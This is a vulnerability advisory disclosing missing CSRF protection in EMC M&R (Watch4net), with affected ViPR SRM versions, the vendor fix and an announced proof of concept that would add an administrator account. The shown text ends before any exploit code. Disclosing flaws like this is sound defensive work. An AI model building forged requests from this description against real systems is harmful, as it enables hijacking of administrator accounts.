EMC M&R (Watch4net) lacks Cross-Site Request Forgery protection

Abstract

It was discovered that EMC M&R (Watch4net) does not protect against Cross-Site Request Forgery (CSRF) attacks. A successful CSRF attack can compromise end user data and may allow an attacker to perform an account hijack. If the targeted end user is the administrator account, this results in a full compromise of Watch4net.

Affected versions

Versions of EMC ViPR SRM prior to version 3.7 are affected by these vulnerabilities.

Fix

EMC released 34247_ViPR-SRM to fix these vulnerabilities. Please note that this fix is only available for registered EMC Online Support customers.

Introduction

EMC M&R (formerly known as Watch4net) enables cross-domain performance monitoring of infrastructure and data center components in real-time - from a single, customizable dashboard. EMC M&R is a core embedded software technology existing in EMC ViPR, ViPR SRM and Service Assurance Suite.

EMC M&R (Watch4net) does not protect against Cross-Site Request Forgery (CSRF) attacks. A successful CSRF attack can compromise end user data and may allow an attacker to perform an account hijack. If the targeted end user is the administrator account, this results in a full compromise of Watch4net.

Details

Cross-Site Request Forgery (CSRF) is an attack, which forces an end user to execute unwanted actions on a web application to which the targeted user is currently authenticated. With a little help of social engineering an attacker may trick the users of a web application into executing actions (requests) of the attacker's choosing.

The following proof of concept will create a new user named CSRF with password set to 1 in Watch4net - provided that the victim is logged in with an administrator account.
